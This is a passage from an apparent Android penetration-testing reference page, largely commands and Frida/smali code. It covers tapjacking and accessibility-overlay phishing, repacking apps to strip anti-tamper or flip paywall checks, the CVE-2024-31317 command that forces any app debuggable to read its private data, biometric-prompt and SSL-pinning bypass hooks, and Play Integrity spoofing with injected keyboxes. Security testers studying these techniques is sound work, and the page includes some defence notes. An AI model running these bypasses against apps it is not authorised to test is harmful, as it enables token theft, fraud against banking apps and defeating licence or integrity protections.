runtime without taskAffinity (patched May 2020 SPL on Android 8-9; 10+ unaffected). Often chained
with tapjacking / TapTrap. Fix: `android:taskAffinity=""` at the application level.

## Tapjacking and accessibility overlay phishing

Tapjacking overlays a transparent window over the victim so taps land on the victim UI without
the user knowing (permission grants, purchases). Android 12+ drops touches from another UID's
`TYPE_APPLICATION_OVERLAY` window when opacity >= 0.8, so attackers keep `alpha < 0.8` or use
fully transparent animation-driven overlays (TapTrap). Modern banking trojans (ToxicPanda, Hook,
Anatsa) escalate to an Accessibility overlay: a WebView added with `TYPE_ACCESSIBILITY_OVERLAY`
and `FLAG_NOT_TOUCH_MODAL` renders a phishing form while forwarding real touches to the app
underneath, bypassing the SYSTEM_ALERT_WINDOW prompt entirely.

```bash
# toggle Android 12+ block for PoC crafting
adb shell am compat disable BLOCK_UNTRUSTED_TOUCHES com.example.victim
adb logcat | grep -i "Untrusted touch"          # system logs occluded taps
# audit for apps holding accessibility bind
adb shell pm list packages -3
```

Defence signals to check for in the target: `android:filterTouchesWhenObscured="true"` /
`setFilterTouchesWhenObscured(true)`, `onFilterTouchEventForSecurity` rejecting
`FLAG_WINDOW_IS_PARTIALLY_OBSCURED`, `FLAG_SECURE`, and (Android 14+)
`android:accessibilityDataSensitive="accessibilityDataPrivateYes"` on sensitive views.

## Smali patching: decompile, modify, recompile, sign

Repacking is how you strip anti-tamper, root/pinning checks, or flip a paywall boolean when
runtime hooks are inconvenient. Full modern flow with `apktool` + `zipalign` + `apksigner`
(preferred over jarsigner for v2/v3 signatures):

```bash
apktool d app.apk                                   # -> smali/ + resources
# edit smali, then:
apktool b . -o dist/app-unsigned.apk
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias k
zipalign -P 16 -f -v 4 dist/app-unsigned.apk dist/app-aligned.apk   # -P 16 for 16KiB page devices
apksigner sign --ks key.jks --out dist/app-signed.apk dist/app-aligned.apk
apksigner verify --verbose --print-certs dist/app-signed.apk
```

Split APKs (`base.apk` + `split_config.*`) must be joined first (apk.sh) or the install fails.
Smali gotchas that break rebuilds: bump `.locals` (not `.registers`, which remaps params);
`move-result*` must immediately follow its `invoke-*`; wide (long/double) values occupy a
register pair; use `/range` variants for many/high registers.

Patching anti-tamper: search JADX for `GET_SIGNING_CERTIFICATES`, `apkContentsSigners`,
`MessageDigest`, `getInstallerPackageName`, `com.android.vending`. Patch the final boolean or
invert the branch rather than rewriting the routine:

```smali
const/4 v0, 0x1              # force "valid"
if-nez v0, :tamper_detected  # inverted from if-eqz
```

Fast path: VS Code + APKLab extension, or apk.sh, automate decompile/patch/recompile/sign.

## Exploiting a debuggable application (JDWP) and forcing debuggable (CVE-2024-31317)

If the manifest has `android:debuggable="true"` (or you patch it in), attach a Java debugger via
JDWP to set breakpoints, read/patch locals, and flip return values at runtime with no source
edit, effectively bypassing root/debug checks from inside the debugger.

```bash
adb shell am setup-debug-app -w <pkg>            # make it wait for debugger (re-run each launch)
adb shell monkey -p <pkg> 1                       # start it
adb jdwp                                           # find the Dalvik VM PID
adb forward tcp:8700 jdwp:<pid>
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
# jdb: classes / methods <cls> / stop at <cls>.onClick / locals / set var = val / run
```

CVE-2024-31317 forces ANY app debuggable without repacking: an `adb`/`WRITE_SECURE_SETTINGS`
holder smuggles a Zygote `--runtime-flags=0x104` (DEBUG_ENABLE_JDWP|DEBUG_JNI_DEBUGGABLE) through
the hidden-API denylist setting; the victim forks with a JDWP thread. Android 9-14 before the
2024-06 patch.

```bash
adb shell settings put global hidden_api_blacklist_exemptions "--runtime-flags=0x104|Lcom/example/Fake;->x:"
adb shell monkey -p com.victim.bank 1
adb jdwp && adb forward tcp:8700 jdwp:<pid>
```

Grants full read/write to any app private dir (token theft, MDM bypass). Mitigate: patch level
2024-06+, restrict shell/WRITE_SECURE_SETTINGS on production.

## Bypassing Android biometric authentication (BiometricPrompt)

The frequent flaw is treating `onAuthenticationSucceeded()` as a UI gate rather than using the
returned `CryptoObject` to unlock a Keystore key. When there is no crypto binding, a Frida hook
that invokes the success callback with a null CryptoObject bypasses the whole prompt (the system
dialog never appears). Works through API 34 if the app does not validate the cipher/signature.

```bash
# WithSecure fingerprint-bypass.js (no CryptoObject) or universal biometric bypass
frida -U -f com.target.app --no-pause -l fingerprint-bypass.js
frida -U -f com.target.app --no-pause -l universal-android-biometric-bypass.js
```

```javascript
// downgrade a strong-only policy to weak/device-credential so the PIN fallback is accepted
var B = Java.use('androidx.biometric.BiometricPrompt$PromptInfo$Builder');
B.setAllowedAuthenticators.implementation = function(f){ return this.setAllowedAuthenticators(0x0002|0x8000); };
```

Secure pattern (what to verify in the target): key generated with
`setUserAuthenticationRequired(true)` and `setInvalidatedByBiometricEnrollment(true)`, the
returned `CryptoObject` cipher used to decrypt real data, and `BIOMETRIC_STRONG` only. Vendor
CVEs (CVE-2023-20995, CVE-2024-53835) target the sensor pipeline itself.

## Advanced anti-instrumentation and modern SSL pinning bypass

When drop-in unpinning scripts hang and apps detect Frida/root at init, layer these tactics.
Root/Zygisk hiding first: Magisk Zygisk + DenyList (add the package, reboot) neutralizes naive
`su`/getprop checks; add Shamiko/LSPosed for stronger hiding. Beat init-time detectors by
attaching after the UI loads instead of spawn-mode:

```bash
frida -U -n com.example.app                       # attach late, past onCreate() checks
frida -U -f com.example.app -l anti-frida-detection.js
frida-trace -n com.example.app -i "JNI_OnLoad"    # follow the native trail
```

Stealth Frida server (phantom-frida) renames ~90 fingerprints (process/thread names, memfd
label, SELinux labels, exported `frida_agent_main`, D-Bus names, port). Automate with Medusa
(90+ modules: `use http_communications/multiple_unpinner`).

Modern pinning lives in OkHttp4+, Cronet/gRPC over BoringSSL, so hook beyond the basic
SSLContext:

```javascript
// OkHttp4 CertificatePinner + Cronet builder
Java.use('okhttp3.CertificatePinner').check.overload('java.lang.String','java.util.List').implementation=function(){};
// native BoringSSL fallback when TLS still fails
const cv = Module.findExportByName(null,'SSL_CTX_set_custom_verify');
if (cv) Interceptor.attach(cv,{ onEnter(a){ a[1]=ptr(0); a[2]=NULL; }});  // SSL_VERIFY_NONE
// native anti-debug: neuter ptrace
const p = Module.findExportByName(null,'ptrace');
if (p) Interceptor.replace(p, new NativeCallback(()=>-1,'int',['int','int','pointer','pointer']));
```

Static fallback (no instrumentation): `apk-mitm app.apk` strips pinning and rewrites the network
security config, then proxy. Force proxy + unpin universally with HTTP Toolkit's
frida-interception-and-unpinning hooks. LSPosed can also hook telephony/SMS APIs
(`getLine1Number`, `sendTextMessage`) to defeat SIM-binding flows on rooted devices.

## Play Integrity (SafetyNet successor) attestation bypass

Play Integrity returns a Google-signed JWT with `appIntegrity`/`deviceIntegrity`/`accountDetails`
verdicts (`MEETS_BASIC/DEVICE/STRONG_INTEGRITY`). You cannot forge the JWT, so you spoof the
signals Google evaluates: hide root, swap the hardware key attestation chain (`keybox.xml`) for a
genuine certified/locked-device one, and spoof the security patch level for STRONG.

Toolchain (Magisk modules): ReZygisk/ZygiskNext (root hide) + TrickyStore + Tricky Addon (keybox
injection, patch-date spoof) + PlayIntegrityFork (prop spoof for the DroidGuard path, mostly
helps Android <13). Validate with the Play Integrity API Checker and Key Attestation APKs. In
TrickyStore: select all, inject a Valid keybox for BASIC+DEVICE, then Set Security Patch for
STRONG. Google revokes abused keyboxes, so rotate when blocked; RKA (relay attestation to a
remote rooted device) avoids burning a keybox per device.

Tester angle against weak backend integrations (more durable than recovering STRONG): check for
missing action binding (`standard` should bind `requestHash`, `classic` a high-entropy nonce),
weak `timestampMillis` freshness (replay windows), over-trusting spoofable `requestPackageName`,
and treating pre-13 STRONG as equivalent to 13+ STRONG.

## Manual and LLM-assisted de-obfuscation

Recognize obfuscation (scrambled strings, binaries in assets + `DexClassLoader` unpacking,
unnamed JNI functions), then either replicate the decrypt routine or observe it at runtime.
For string encryption, the goal is to execute the algorithm, not fully understand it: lift the
decrypt method into a standalone Java/Python harness, or hook it with Frida and log inputs and
plaintext at the moment of decryption. Packers/DexClassLoader payloads are best recovered
dynamically by dumping the loaded DEX after unpack.

LLM-assisted (Androidmeda) automates the tedious renaming/control-flow-recovery over jadx output:

```bash
jadx -d input_dir/ target.apk                # decompile, trim to app packages
python3 androidmeda.py --llm_provider ollama --llm_model llama3.2 \
  --source_dir input_dir/ --output_dir out/ --save_code true   # offline, no data egress
```

It renames ProGuard/DexGuard identifiers to semantic names, unflattens control flow, decrypts
common string schemes, and writes a `vuln_report.json`. Use the offline ollama backend when the
app is sensitive.

## References

* [A beginners guide to using Frida to bypass root detection. - DianaOpanga - November 27, 2023](https://medium.com/@dianaopanga/a-beginners-guide-to-using-frida-to-bypass-root-detection-16af76b989ac)
* [Android App Reverse Engineering 101 - @maddiestone](https://www.ragingrock.com/AndroidAppRE/)
* [Android app vulnerability classes - Google Play Protect](https://static.googleusercontent.com/media/www.google.com/fr//about/appsecurity/play-rewards/Android_app_vulnerability_classes.pdf)
* [Appium documentation](https://appium.io/docs/en/latest/)
* [Configuring Android Emulator with Burp Suite - Jarrod @Jrod_R87 - January 8, 2025](https://owlhacku.com/configuring-android-emulator-with-burp-suite/)
* [Configuring Burp Suite with Android Emulators - Aashish Tamang - June 6, 2022](https://blog.yarsalabs.com/setting-up-burp-for-android-application-testing/)
* [Configuring Burp Suite With Android Nougat - ropnop - January 18, 2018](https://blog.ropnop.com/configuring-burp-suite-with-android-nougat)
* [Configuring Frida with BurpSuite and Genymotion to bypass Android SSL Pinning - arben - September 4, 2020](https://spenkk.github.io/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning/)
* [How to root an Android device for analysis and vulnerability assessment - Joe Lovett - August 23, 2024](https://www.pentestpartners.com/security-blog/how-to-root-an-android-device-for-analysis-and-vulnerability-assessment/)
* [Intercepting OkHttp at Runtime With Frida - A Practical Guide - Szymon Drosdzol - January 22, 2026](https://blog.doyensec.com/2026/01/22/frida-instrumentation.html)
* [Introduction to Android Pentesting - Jarrod - July 8, 2024](https://owlhacku.com/introduction-to-android-pentesting/)
* [Mobile Systems and Smartphone Security - @reyammer](https://mobisec.reyammer.io)
* [Rooting an Android Emulator for Mobile Security Testing - 8ksecresearch - April 17, 2025](https://8ksec.io/rooting-an-android-emulator-for-mobile-security-testing/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[apktool]]
- [[burp-suite]]
- [[frida]]
- [[ghidra]]
- [[jadx]]
- [[radare2]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[ios-application]]
